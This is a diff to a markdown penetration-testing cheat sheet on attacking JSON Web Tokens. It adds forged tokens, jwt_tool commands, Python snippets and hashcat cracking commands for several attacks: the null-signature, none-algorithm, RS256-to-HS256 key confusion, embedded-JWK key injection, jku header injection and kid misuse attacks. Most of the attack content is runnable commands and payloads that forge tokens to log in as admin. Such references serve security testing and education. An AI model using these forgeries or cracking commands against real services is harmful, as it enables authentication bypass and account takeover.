@@ -9,23 +9,29 @@
 - [JWT Format](#jwt-format)
   - [Header](#header)
   - [Payload](#payload)
-- [JWT Signature - None algorithm (CVE-2015-9235)](#jwt-signature---none-algorithm-cve-2015-9235)
-- [JWT Signature - RS256 to HS256 (CVE-2016-5431)](#jwt-signature---rs256-to-hs256-cve-2016-5431)
+- [JWT Signature](#jwt-signature)
+    - [JWT Signature - Null Signature Attack (CVE-2020-28042)](#jwt-signature---null-signature-attack-cve-2020-28042)
+    - [JWT Signature - Disclosure of a correct signature (CVE-2019-7644)](#jwt-signature---disclosure-of-a-correct-signature-cve-2019-7644)
+    - [JWT Signature - None algorithm (CVE-2015-9235)](#jwt-signature---none-algorithm-cve-2015-9235)
+    - [JWT Signature - Key Confusion Attack RS256 to HS256 (CVE-2016-5431)](#jwt-signature---key-confusion-attack-rs256-to-hs256-cve-2016-5431)
+    - [JWT Signature - Key Injection Attack (CVE-2018-0114)](#jwt-signature---key-injection-attack-cve-2018-0114)
 - [JWT Secret](#jwt-secret)
   - [Encode and Decode JWT with the secret](#encode-and-decode-jwt-with-the-secret)
   - [Break JWT secret](#break-jwt-secret)
     - [JWT tool](#jwt-tool)
-    - [JWT cracker](#jwt-cracker)
-    - [JWT pwn](#jwt-pwn)
     - [Hashcat](#hashcat)
-- [JWT Kid Claim Misuse](#jwt-kid-claim-misuse)
+- [JWT Claims](#jwt-claims)
+    - [JWT kid Claim Misuse](#jwt-kid-claim-misuse)
+    - [JWKS - jku header injection](#jwks---jku-header-injection)
 - [References](#references)
+
 
 ## Tools
 
-- [jwt_tool](https://github.com/ticarpi/jwt_tool)
-- [c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)
+- [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
+- [brendan-rius/c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)
 - [JOSEPH - JavaScript Object Signing and Encryption Pentesting Helper](https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61)
+- [jwt.io - Encoder – Decoder](https://jwt.io/)
 
 ## JWT Format
 
@@ -88,6 +94,8 @@ Default algorithm is "HS256" (HMAC SHA256 symmetric encryption).
 | PS384 | RSASSA-PSS using SHA-384 and MGF1 with SHA-384 | Optional      |
 | PS512 | RSASSA-PSS using SHA-512 and MGF1 with SHA-512 | Optional      |
 | none	| No digital signature or MAC performed          | Required      |
+
+Inject headers with [ticarpi/jwt_tool](#): `python3 jwt_tool.py JWT_HERE -I -hc header1 -hv testval1 -hc header2 -hv testval2`
  
 
 ### Payload
@@ -110,14 +118,41 @@ Claims are the predefined keys and their values:
 - sub: subject of the token (rarely used)
 - aud: audience of the token (also rarely used)
 
-JWT Encoder – Decoder: `http://jsonwebtoken.io`
-
-## JWT Claims
-
-[IANA's JSON Web Token Claims](https://www.iana.org/assignments/jwt/jwt.xhtml)
+Inject payload claims with [ticarpi/jwt_tool](#): `python3 jwt_tool.py JWT_HERE -I -pc payload1 -pv testval3`
 
 
-## JWT Signature - None algorithm (CVE-2015-9235)
+## JWT Signature
+
+### JWT Signature - Null Signature Attack (CVE-2020-28042)
+
+Send a JWT with HS256 algorithm without a signature like `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.`
+
+**Exploit**:
+```ps1
+python3 jwt_tool.py JWT_HERE -X n
+```
+
+**Deconstructed**:
+```json
+{"alg":"HS256","typ":"JWT"}.
+{"sub":"1234567890","name":"John Doe","iat":1516239022}
+```
+
+
+### JWT Signature - Disclosure of a correct signature (CVE-2019-7644)
+
+Send a JWT with an incorrect signature, the endpoint might respond with an error disclosing the correct one.
+
+* [jwt-dotnet/jwt: Critical Security Fix Required: You disclose the correct signature with each SignatureVerificationException... #61](https://github.com/jwt-dotnet/jwt/issues/61)
+* [CVE-2019-7644: Security Vulnerability in Auth0-WCF-Service-JWT](https://auth0.com/docs/secure/security-guidance/security-bulletins/cve-2019-7644)
+
+```
+Invalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIs
+Invalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgBOo=
+```
+
+
+### JWT Signature - None algorithm (CVE-2015-9235)
 
 JWT supports a `None` algorithm for signature. This was probably introduced to debug applications. However, this can have a severe impact on the security of the application.
 
@@ -127,27 +162,34 @@ None algorithm variants:
 * NONE
 * nOnE
 
-To exploit this vulnerability, you just need to decode the JWT and change the algorithm used for the signature. Then you can submit your new JWT.
-
-However, this won't work unless you **remove** the signature
+To exploit this vulnerability, you just need to decode the JWT and change the algorithm used for the signature. Then you can submit your new JWT. However, this won't work unless you **remove** the signature
 
 Alternatively you can modify an existing JWT (be careful with the expiration time)
 
-```python
-import jwt
+* Using [ticarpi/jwt_tool](#)
+    ```ps1
+    python3 jwt_tool.py [JWT_HERE] -X a
+    ```
 
-jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'
-decodedToken = jwt.decode(jwtToken, verify=False)  					
+* Manually editing the JWT
+    ```python
+    import jwt
 
-# decode the token before encoding with type 'None'
-noneEncoded 	= jwt.encode(decodedToken, key='', algorithm=None)
+    jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'
+    decodedToken = jwt.decode(jwtToken, verify=False)  					
 
-print(noneEncoded.decode())
-```
+    # decode the token before encoding with type 'None'
+    noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)
 
-## JWT Signature - RS256 to HS256 (CVE-2016-5431)
+    print(noneEncoded.decode())
+    ```
 
-Because the public key can sometimes be obtained by the attacker, the attacker can modify the algorithm in the header to HS256 and then use the RSA public key to sign the data.
+
+### JWT Signature - Key Confusion Attack RS256 to HS256 (CVE-2016-5431)
+
+If a server’s code is expecting a token with "alg" set to RSA, but receives a token with "alg" set to HMAC, it may inadvertently use the public key as the HMAC symmetric key when verifying the signature.
+
+Because the public key can sometimes be obtained by the attacker, the attacker can modify the algorithm in the header to HS256 and then use the RSA public key to sign the data. When the applications use the same RSA key pair as their TLS web server: `openssl s_client -connect example.com:443 | openssl x509 -pubkey -noout`
 
 > The algorithm **HS256** uses the secret key to sign and verify each message.
 > The algorithm **RS256** uses the private key to sign the message and uses the public key for authentication.
@@ -161,35 +203,67 @@ print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
 
 :warning: This behavior is fixed in the python library and will return this error `jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.`. You need to install the following version: `pip install pyjwt==0.4.3`.
 
-Here are the steps to edit an RS256 JWT token into an HS256
-
-1. Convert our public key (key.pem) into HEX with this command.
-
-    ```powershell
-    $ cat key.pem | xxd -p | tr -d "\\n"
-    2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a
+* Using [ticarpi/jwt_tool](#)
+    ```ps1
+    python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem
     ```
+* Manually using the following steps to edit an RS256 JWT token into an HS256
+    1. Convert our public key (key.pem) into HEX with this command.
 
-2. Generate HMAC signature by supplying our public key as ASCII hex and with our token previously edited.
+        ```powershell
+        $ cat key.pem | xxd -p | tr -d "\\n"
+        2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a
+        ```
 
-    ```powershell
-    $ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a
+    2. Generate HMAC signature by supplying our public key as ASCII hex and with our token previously edited.
 
-    (stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0
-    ```
+        ```powershell
+        $ echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a
 
-3. Convert signature (Hex to "base64 URL")
+        (stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0
+        ```
 
-    ```powershell
-    $ python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0')).replace('=','')\")"
-    ```
+    3. Convert signature (Hex to "base64 URL")
 
-4. Add signature to edited payload
+        ```powershell
+        $ python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0')).replace('=','')\")"
+        ```
 
-    ```powershell
-    [HEADER EDITED RS256 TO HS256].[DATA EDITED].[SIGNATURE]
-    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA
-    ```
+    4. Add signature to edited payload
+
+        ```powershell
+        [HEADER EDITED RS256 TO HS256].[DATA EDITED].[SIGNATURE]
+        eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA
+        ```
+
+
+### JWT Signature - Key Injection Attack (CVE-2018-0114)
+
+> A vulnerability in the Cisco node-jose open source library before 0.11.0 could allow an unauthenticated, remote attacker to re-sign tokens using a key that is embedded within the token. The vulnerability is due to node-jose following the JSON Web Signature (JWS) standard for JSON Web Tokens (JWTs). This standard specifies that a JSON Web Key (JWK) representing a public key can be embedded within the header of a JWS. This public key is then trusted for verification. An attacker could exploit this by forging valid JWS objects by removing the original signature, adding a new public key to the header, and then signing the object using the (attacker-owned) private key associated with the public key embedded in that JWS header.
+
+
+**Exploit**:
+```ps1
+python3 jwt_tool.py [JWT_HERE] -X i
+```
+
+**Deconstructed**:
+```json
+{
+  "alg": "RS256",
+  "typ": "JWT",
+  "jwk": {
+    "kty": "RSA",
+    "kid": "jwt_tool",
+    "use": "sig",
+    "e": "AQAB",
+    "n": "uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw"
+  }
+}.
+{"login":"admin"}.
+[Signed with new Private key; Public key injected]
+```
+
 
 ## JWT Secret
 
@@ -197,13 +271,24 @@ Here are the steps to edit an RS256 JWT token into an HS256
 
 ### Encode and Decode JWT with the secret
 
-Using [pyjwt](https://pyjwt.readthedocs.io/en/stable/): `pip install pyjwt`
+* Using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool): 
+    ```ps1
+    jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds
+    jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds -T
+    
+    Token header values:
+    [+] alg = "HS256"
+    [+] typ = "JWT"
 
-```python
-import jwt
-encoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='HS256')
-jwt.decode(encoded, 'secret', algorithms=['HS256']) 
-```
+    Token payload values:
+    [+] name = "John Doe"
+    ```
+* Using [pyjwt](https://pyjwt.readthedocs.io/en/stable/): `pip install pyjwt`
+    ```python
+    import jwt
+    encoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='HS256')
+    jwt.decode(encoded, 'secret', algorithms=['HS256']) 
+    ```
 
 ### Break JWT secret
 
@@ -267,35 +352,21 @@ Your new forged token:
 * Review: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin`
 
 
-#### JWT cracker
-
-```ps1
-git clone https://github.com/brendan-rius/c-jwt-cracker
-./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE
-Secret is "Sn1f"
-```
-
-#### jwt-pwn
-
-```ps1
-git clone https://github.com/mazen160/jwt-pwn
-python3 jwt-cracker.py -jwt "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqd3QiOiJwd24ifQ.4pOAm1W4SHUoOgSrc8D-J1YqLEv9ypAApz27nfYP5L4" -t 10 -w jwt.secrets.list
-[#] KEY FOUND: 1234
-```
-
-
 #### Hashcat
 
 > Support added to crack JWT (JSON Web Token) with hashcat at 365MH/s on a single GTX1080 - [src](https://twitter.com/hashcat/status/955154646494040065)
 
-```ps1
-/hashcat -m 16500 hash.txt -a 3 -w 3 ?a?a?a?a?a?a
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMj...Fh7HgQ:secret
-```
+* Dictionary attack: `hashcat -a 0 -m 16500 jwt.txt wordlist.txt`
+* Rule-based attack: `hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule`
+* Brute force attack: `hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6`
 
 
+## JWT Claims
 
-## JWT Kid Claim Misuse
+[IANA's JSON Web Token Claims](https://www.iana.org/assignments/jwt/jwt.xhtml)
+
+
+### JWT kid Claim Misuse
 
 The "kid" (key ID) claim in a JSON Web Token (JWT) is an optional header parameter that is used to indicate the identifier of the cryptographic key that was used to sign or encrypt the JWT. It is important to note that the key identifier itself does not provide any security benefits, but rather it enables the recipient to locate the key that is needed to verify the integrity of the JWT.
 
@@ -347,6 +418,34 @@ The common ways to misuse the kid header:
   ```
 
 * Modify the kid header to attempt SQL and Command Injections
+
+
+### JWKS - jku header injection
+
+"jku" header value points to the URL of the JWKS file. By replacing the "jku" URL with an attacker-controlled URL containing the Public Key, an attacker can use the paired Private Key to sign the token and let the service retrieve the malicious Public Key and verify the token.
+
+It is sometimes exposed publicly via a standard endpoint:
+
+* `/jwks.json`
+* `/.well-known/jwks.json`
+* `/openid/connect/jwks.json`
+* `/api/keys`
+* `/api/v1/keys`
+
+**Exploit**:
+
+```ps1
+python3 jwt_tool.py JWT_HERE -X s
+python3 jwt_tool.py JWT_HERE -X s -ju http://example.com/jwks.json
+```
+
+**Deconstructed**:
+
+```json
+{"typ":"JWT","alg":"RS256", "jku":"https://example.com/jwks.json"}.
+{"login":"admin"}.
+[Signed with new Private key; Public key exported]
+```
 
 
 ## Labs 
